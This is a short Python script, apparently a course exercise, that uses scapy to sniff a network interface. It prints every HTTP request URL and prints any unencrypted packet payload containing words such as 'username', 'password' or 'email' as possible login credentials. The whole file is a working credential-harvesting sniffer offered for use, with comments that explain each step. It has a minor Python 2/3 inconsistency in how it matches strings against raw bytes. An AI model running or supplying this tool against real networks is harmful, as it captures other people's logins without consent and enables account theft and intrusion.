#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse

def get_arguments():
    parser = optparse.OptionParser()

    #Adds options to use and a description to help menu
    parser.add_option("-i", "--iface", dest="interface", help="Interface to sniff on")

    #parse_args() return 2 sets of strings which is (options, arguments)
    (options, args) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface. Use --help for more info")

    return options 


def sniff(interface):
    #The sniff function checks every packet that goes by the specified interface
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
    http_request = packet[http.HTTPRequest]
    host = http_request.Host
    path = http_request.Path
    url = host+path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            #This is the way to access a layer of a packet
            load = packet[scapy.Raw].load
            keywords = ["username","user","uname","password","email","pass","login"]
            for word in keywords:
                #In python need cast the load to string
                if word in load:
                   return load

def process_sniffed_packet(packet):
    #packet.haslayer checks if the a packet has a specific layer
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        #In python 3 the url needs to be a string so cast it with str() or with url.decode()
        print("[+] HTTP Request >> "+ url + "\n\n")
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username and password >> " + login_info + "\n\n")

options = get_arguments()
sniff(options.interface)